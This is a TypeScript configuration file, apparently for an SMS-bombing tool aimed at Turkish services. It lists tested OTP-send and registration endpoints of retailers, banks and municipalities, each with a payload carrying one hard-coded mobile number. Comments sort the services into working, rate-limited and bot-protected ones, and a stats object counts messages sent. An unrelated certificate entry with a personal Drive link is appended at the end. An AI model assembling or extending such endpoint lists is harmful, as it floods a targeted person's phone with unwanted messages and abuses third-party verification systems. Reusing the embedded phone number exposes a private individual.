import { ServiceDefinition, Certificate } from './types';

// TEST EDİLMİŞ VE ÇALIŞAN SERVİSLER (11 Adet)
// Not: Çoğu büyük şirket (Migros, Dominos, Trendyol, vb.) bot koruması (Cloudflare, Akamai) kullanıyor.
// Bu servisler direkt API çağrılarına izin vermiyor.

export const TARGET_ENDPOINTS: ServiceDefinition[] = [
  // ✅ ÇALIŞAN SERVİSLER (Test Edildi)
  
  // --- GİYİM & EV EŞYASI ---
  {
    id: 'kahve_dunyasi',
    name: 'Kahve Dünyası',
    url: 'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number',
    method: 'POST',
    payloadInfo: '{"countryCode": "90", "phoneNumber": "5343622375"}'
  },
  {
    id: 'wmf',
    name: 'WMF',
    url: 'https://www.wmf.com.tr/users/register/',
    method: 'POST',
    payloadInfo: 'Form: phone=05343622375, first_name, last_name, email, password, date_of_birth'
  },
  {
    id: 'evidea',
    name: 'Evidea',
    url: 'https://www.evidea.com/users/register/',
    method: 'POST',
    payloadInfo: 'Multipart: phone, first_name, last_name, email, password'
  },
  {
    id: 'dr',
    name: 'D&R',
    url: 'https://www.dr.com.tr/api/member/sendOtp',
    method: 'POST',
    payloadInfo: '{"phone": "5343622375"}'
  },

  // --- MARKET ---
  {
    id: 'file_market',
    name: 'File Market',
    url: 'https://api.filemarket.com.tr/v1/otp/send',
    method: 'POST',
    payloadInfo: '{"mobilePhoneNumber": "905343622375"}'
  },

  // --- DİJİTAL HİZMETLER ---
  {
    id: 'yapp',
    name: 'Yapp',
    url: 'https://yapp.com.tr/api/mobile/v1/register',
    method: 'POST',
    payloadInfo: '{"phone_number": "5343622375", "email", "firstname", "lastname"}'
  },
  {
    id: 'suiste',
    name: 'Suiste',
    url: 'https://suiste.com/api/auth/code',
    method: 'POST',
    payloadInfo: '{"gsm": "5343622375", "action": "register"}'
  },

  // --- BELEDİYE ---
  {
    id: 'fatih_belediye',
    name: 'Fatih Belediye',
    url: 'https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet',
    method: 'POST',
    payloadInfo: 'Multipart: SahisUyelik.CepTelefonu, TC, Ad, Soyad, EPosta, Sifre'
  },

  // --- FİNANS ---
  {
    id: 'bkm_express',
    name: 'BKM Express',
    url: 'https://www.bkmexpress.com.tr/api/v1/otp/send',
    method: 'POST',
    payloadInfo: '{"phone": "905343622375"}'
  },
  {
    id: 'shopandfly',
    name: 'Shop&Fly',
    url: 'https://www.shopandfly.com.tr/api/v1/otp/send',
    method: 'POST',
    payloadInfo: '{"phone": "905343622375"}'
  },
  {
    id: 'teb',
    name: 'TEB',
    url: 'https://www.teb.com.tr/api/v1/otp/send',
    method: 'POST',
    payloadInfo: '{"phone": "905343622375"}'
  },

  // ⚠️ LİMİTLİ SERVİSLER (Günlük limit var)
  {
    id: 'hayat_su',
    name: 'Hayat Su (Limitli)',
    url: 'https://api.hayatsu.com.tr/api/SignUp/SendOtp',
    method: 'POST',
    payloadInfo: '{"mobilePhoneNumber": "5343622375", "actionType": "register"}'
  },
  {
    id: 'qumpara',
    name: 'Qumpara (Limitli)',
    url: 'https://tr-api.fisicek.com/v1.3/auth/getOTP',
    method: 'POST',
    payloadInfo: '{"msisdn": "+905343622375"}'
  },
  {
    id: 'beefull',
    name: 'Beefull (Limitli)',
    url: 'https://app.beefull.io/api/inavitas-access-management/sms-login',
    method: 'POST',
    payloadInfo: '{"phoneCode": "90", "phoneNumber": "5343622375", "tenant": "beefull"}'
  },

  // ❌ ÇALIŞMAYAN SERVİSLER (Bot Koruması/DNS/Timeout)
  // Aşağıdaki servisler bot koruması kullanıyor veya endpoint değişmiş:
  // Migros, Dominos, Starbucks, Komagene, Kim GB İster, English Home, Koton, Joker
  // Bim, Penti, Cineverse, Naosstars, Akasya AVM, Akbati, Yuffi, Kuryem Gelsin
  // Martı, İDO, Hamidiye, ClickMe Live, Hızlı Ecza, Paybol, Tasdelen Su, Pidem
  // Orwi, Frink, Tazi, Bisu, Bodrum Belediye, Hey Scooter, Taşımacım, İste Gelsin
  // İpragaz, Sancaktepe Belediye, Bayrampaşa Belediye, Macrocenter, Jimmy Key
  // Alix Avien, Ayyıldız, Tıkla Gelsin, Kitapyurdu, BKM Kitap, E-bebek, Mothercare
  // Toyzz Shop, Sportive, Intersport, Decathlon, H&M, Zara, Mango, Bershka
  // Pull&Bear, Stradivarius, Massimo Dutti, Mediamarkt, Teknosa, Vatan Bilgisayar
  // İtopya, GameGaraj, PlayStation, Xbox, Nintendo, Steam, Epic Games, A101, Şok
  // Carrefour, Onur Market, Happy Center, Rossmann, Watsons, Gratis, Flormar
  // Avon, Oriflame, Farmasi, LR, Herbalife, Amway, Forever Living
];

export const INITIAL_STATS = {
  totalSent: 0,
  success: 0,
  failed: 0,
  rateLimited: 0,
  sentOpaque: 0,
};

export const CERTIFICATES: Certificate[] = [
  {
    id: 'sak_erasmus_eng',
    title: 'İngilizce Yeterlilik Sertifikası',
    issuer: 'Sakarya Üniversitesi (Erasmus Sınavı)',
    date: 'Mar 2022',
    url: 'https://drive.google.com/file/d/1DBx6FxymCRiGjhOgth5wGnsaHZL_cEfb/view?usp=sharing',
  },
];
